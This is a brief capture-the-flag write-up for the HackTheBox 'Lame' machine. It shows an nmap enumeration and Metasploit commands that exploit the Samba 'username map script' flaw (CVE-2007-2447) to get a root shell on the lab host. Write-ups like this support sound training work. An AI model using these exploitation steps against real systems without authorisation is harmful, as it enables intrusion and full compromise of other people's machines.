# HackTheBox - Lame Machine Writeup

This is a sample writeup for the **Lame** machine on HackTheBox.

## Enumeration

Starting with an Nmap scan to identify open ports and services:

```bash
nmap -sC -sV -oN lame.nmap 10.10.10.3
```

### Results

| Port | Service | Version |
|------|---------|---------|
| 21   | FTP     | vsftpd 2.3.4 |
| 22   | SSH     | OpenSSH 4.7p1 |
| 139  | SMB     | Samba 3.0.20 |
| 445  | SMB     | Samba 3.0.20 |

## Exploitation

The Samba version 3.0.20 is vulnerable to **CVE-2007-2447** (username map script command execution).

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LPORT 4444
exploit
```

We get a **root shell** directly!

```bash
whoami
# root
cat /root/root.txt
# [REDACTED]
```

## Lessons Learned

- Always check service versions against known CVEs
- Samba has historically been a goldmine for exploitation
- Sometimes the simplest path is the right one

## Difficulty

⭐ Easy — Great beginner box for learning enumeration and Metasploit basics.
